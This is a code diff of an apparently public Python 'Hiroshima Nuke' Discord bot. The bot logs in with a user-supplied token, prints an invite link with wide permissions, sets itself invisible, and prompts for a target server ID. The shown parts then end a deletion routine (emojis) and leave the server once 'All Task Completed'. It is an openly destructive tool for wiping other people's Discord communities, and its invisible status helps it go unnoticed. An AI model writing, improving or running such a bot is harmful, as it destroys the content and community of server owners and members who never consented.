@@ -2,37 +2,35 @@
 """
 # Author: Ryan Lee / Naeng#0001
 # License: Public
-# Hiroshima Nuke on Servers
-# 1 - Install Pre-req     : sudo apt-get -y update && apt install -y python3.7
-# 2 - Install discord.py  : python3 -m pip install discord.py
-# 4 - Run this command    : python3 hiroshima.py
-# 5 - Follow the steps.....
+# Guide on https://github.com/itsnaeng/hiroshima-nuke
 """
 
 import discord
 import asyncio
 
-client = discord.Client()
-current = discord.Game('the keyboard')
+# Enter your bot token before you start
+# Start off by finding it from https://discordapp.com/developers/applications/
 
-while True:
-    try:
-        TOKEN = input('Enter bot token: ')
-        server_id = int(input('Enter the server ID: '))
-        break
-    except ValueError:
-        print('Invalid Option')
-        continue
+TOKEN = input('Enter bot token: ') 
+client = discord.Client()
 
 @client.event
 async def on_ready():
     print('------')
     print('Logged in as "{name}" (ID: {id})'.format(name=client.user.name, id=client.user.id))
+    print('...')
+    print('Here\'s the invite link for your bot!')
     print('https://discordapp.com/api/oauth2/authorize?client_id={id}&permissions=1342178358&scope=bot'.format(id=client.user.id))
-    await client.change_presence(status=discord.Status.dnd, activity=current)
+    await client.change_presence(status=discord.Status.invisible)
+    while True:
+        try:
+            server_id = int(input('Enter the server ID: '))
+            break
+        except ValueError:
+            print('Invalid Option')
+            continue
     print('------')
     for guild in client.guilds:
-        # print(guild.id)
         if guild.id == server_id:
             print('Discord server "{}" was selected as a target...'.format(guild.name))
             print('...')
@@ -65,6 +63,7 @@ async def on_ready():
                 except:
                     print (f"[EMOJI NOT DELETED] {emoji.name} in '{guild.name}'")
             print('Left the server...')
+            print('Reason: Finished or kicked')
             print('------')
             print('All Task Completed')
             await guild.leave()
@@ -75,7 +74,7 @@ async def on_ready():
 
 @client.event
 async def on_guild_remove(self):
-    print('Bot was removed from "{}"'.format(server_id))
+    print('Bot was removed server')
     print('Exiting the script')
     print('------')
     raise SystemExit
